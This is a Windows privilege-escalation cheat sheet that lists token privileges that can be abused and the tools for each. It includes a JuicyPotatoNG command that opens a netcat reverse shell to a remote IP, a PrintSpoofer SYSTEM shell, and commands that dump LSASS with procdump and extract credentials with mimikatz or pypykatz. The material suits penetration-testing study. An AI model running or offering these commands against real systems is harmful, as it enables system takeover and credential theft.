Common Privileged Rights Abused for LPE
SeBackupPrivilege
Allows: Reading any file regardless of ACLs.
Exploit:
Dump NTDS.dit, SAM, or registry hives.
Read protected files like SYSTEM or SECURITY hives.
Tool:
RawCopy.exe
DiskShadow.exe
SharpBackup
SeRestorePrivilege
Allows: Writing to any file, ignoring permissions.
Exploit:
Overwrite protected system files or registry hives.
Restore sensitive configs or binaries.
Tool: DiskShadow.exe, custom C# tools



## SeImpersonatePrivilege
> Allows: Impersonating access tokens of other users (like SYSTEM).
Exploit:
Token impersonation or privilege escalation via named pipes.
Abuse services like PrintSpoofer or JuicyPotato.
- Using `JuicyPotatoNG.exe`
  ```powershell
  juicypotatong.exe -t * -p "C:\windows\system32\cmd.exe" -a "/c C:\Temp\nc64.exe 192.168.1.1 4444 -e cmd"
  ```
- Using `PrintSpoofer64.exe`
  ```powershell
  PrintSpoofer64.exe -i -c cmd
  ```
Tool: PrintSpoofer.exe, Potato family (JuicyPotatoNG, RoguePotato, etc.)



SeAssignPrimaryTokenPrivilege
Allows: Assigning a primary token to a new process.
Exploit:
Used in conjunction with SeImpersonate for full SYSTEM shells.
Tool: Often used as part of token-impersonation chains.



## SeDebugPrivilege
> Allows: Attaching to any process, including SYSTEM-level processes.
Exploit:
Dump LSASS (for creds).
Inject code into SYSTEM processes.
Tool: Mimikatz, Process Hacker, WinDbg
- Dumping lsass.exe process Using `procdump64.exe` from `sysinternals`
  ```powershell
  procdump64.exe -accepteula -ma lsass.exe lsass.dmp
  ```
  - Then we can use `pypykatz` (on our machine) on `lsass.dmp`
  ```bash
  pypykatz lsa minidump lsass.dmp
  ```
  - OR use mimkatz.exe on the targer machine
  ```powershell
  ./mimikatz.exe 'sekurlsa::minidump lsass.dmp' exit
  ./mimikatz.exe 'sekurlsa::logonpasswords' exit
  ```



SeLoadDriverPrivilege
Allows: Loading kernel drivers.
Exploit:
Load a signed vulnerable driver → execute kernel-mode shellcode.
Tool: KDU, DrvLoader, vulnerable driver exploits
SeTcbPrivilege (“Act as part of the operating system”)
Allows: Full control of the OS; rarely granted.
Exploit:
Can be used to create SYSTEM tokens, manipulate LSA.
Tool: Requires manual handling or advanced C++ exploits.
SeCreateTokenPrivilege
Allows: Creating new access tokens.
Exploit:
Craft fake SYSTEM tokens for privilege escalation.
Tool: Advanced abuse with custom scripts or C/C++ tooling.
